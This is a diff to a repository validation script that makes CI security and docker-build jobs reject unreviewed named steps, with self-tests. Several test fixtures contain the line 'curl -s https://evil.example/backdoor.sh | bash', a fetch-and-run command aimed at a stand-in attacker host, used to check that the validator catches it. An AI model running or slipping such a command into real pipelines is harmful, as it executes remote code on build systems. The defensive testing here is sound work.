@@ -145,6 +145,20 @@ CONDUCTOR_GATES = (
 CONDUCTOR_REQUIRED_COMMANDS = tuple(command for command, _, _ in CONDUCTOR_GATES)
 # ci.yml validate-job steps that legitimately run something other than a gate.
 CI_VALIDATE_SUPPORT_STEPS = frozenset({"Install dependencies", "Check whitespace"})
+# Every named `run:` step in jobs.security and jobs.docker-build. Each one is
+# individually validated below (require_run_pattern/step_by_name); this set
+# exists only so an entirely new, unvalidated named step can be rejected by
+# require_known_run_steps() instead of silently running unreviewed.
+CI_SECURITY_STEPS = frozenset(
+    {
+        "Audit runtime Python dependencies",
+        "Install Gitleaks",
+        "Self-test secret scanner",
+        "Self-test repo config detects and excludes correctly",
+        "Scan current tree for secrets",
+    }
+)
+CI_DOCKER_BUILD_STEPS = frozenset({"Build add-on image"})
 FAVICON_SOURCE = "assets/sleepradar-mark.svg"
 FAVICON_PATH = "favicon.svg"
 FAVICON_VIEW_BOX = "0 0 128 128"
@@ -348,6 +362,29 @@ def require_run_pattern(
         fail(f".github/workflows/ci.yml step {name!r} must {description}")
 
 
+def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> None:
+    """Reject any named `run:` step not in `known_names` for this job.
+
+    Without this, a brand-new step with a name that has never been seen
+    before (so it can't collide with an existing gate's name) would run
+    completely unvalidated: it isn't a duplicate of a known step, and it
+    isn't checked by any name-specific require_run_pattern()/step_by_name()
+    call, so nothing in this file would ever look at it.
+    """
+
+    for step in steps:
+        name = step.get("name")
+        if isinstance(step.get("run"), str) and name not in known_names:
+            fail(
+                f".github/workflows/ci.yml jobs.{job_name} step {name!r} is not "
+                "a documented step for this job; add it to the known-step set "
+                "for that job in scripts/validate_repository.py (and to "
+                "CONDUCTOR_GATES, .conductor/settings.toml, CONTRIBUTING.md, "
+                "and .github/PULL_REQUEST_TEMPLATE.md if it should also be a "
+                "shared local/CI gate)"
+            )
+
+
 def validate_workflow(jobs=None) -> None:
     jobs = workflow_jobs() if jobs is None else jobs
     validate_steps = job_steps(jobs, "validate")
@@ -441,6 +478,13 @@ def validate_workflow(jobs=None) -> None:
                 ".github/PULL_REQUEST_TEMPLATE.md so local runs stay "
                 "CI-equivalent"
             )
+
+    # The validate-job check above only covers jobs.validate. Without an
+    # equivalent check here, a brand-new (non-duplicate) named step appended
+    # to jobs.security or jobs.docker-build — the jobs that run Gitleaks and
+    # build the Docker image — would run completely unreviewed.
+    require_known_run_steps(security_steps, CI_SECURITY_STEPS, "security")
+    require_known_run_steps(docker_steps, CI_DOCKER_BUILD_STEPS, "docker-build")
 
     for step in all_steps:
         run = step.get("run")
@@ -1448,6 +1492,39 @@ def run_self_test() -> None:
                 + [
                     {
                         "name": "Validate add-on package",
+                        "run": "curl -s https://evil.example/backdoor.sh | bash",
+                    }
+                ],
+            )
+        ),
+    )
+    # The validate-job completeness check has no equivalent for security/
+    # docker-build: a brand-new, non-duplicate-named step there would run
+    # completely unvalidated. Both jobs must reject an unknown named step.
+    expect_fail(
+        "workflow unknown security step",
+        lambda: validate_workflow(
+            workflow_with(
+                "security",
+                lambda steps: steps
+                + [
+                    {
+                        "name": "Totally new unrelated security step",
+                        "run": "curl -s https://evil.example/backdoor.sh | bash",
+                    }
+                ],
+            )
+        ),
+    )
+    expect_fail(
+        "workflow unknown docker-build step",
+        lambda: validate_workflow(
+            workflow_with(
+                "docker-build",
+                lambda steps: steps
+                + [
+                    {
+                        "name": "Totally new unrelated docker step",
                         "run": "curl -s https://evil.example/backdoor.sh | bash",
                     }
                 ],
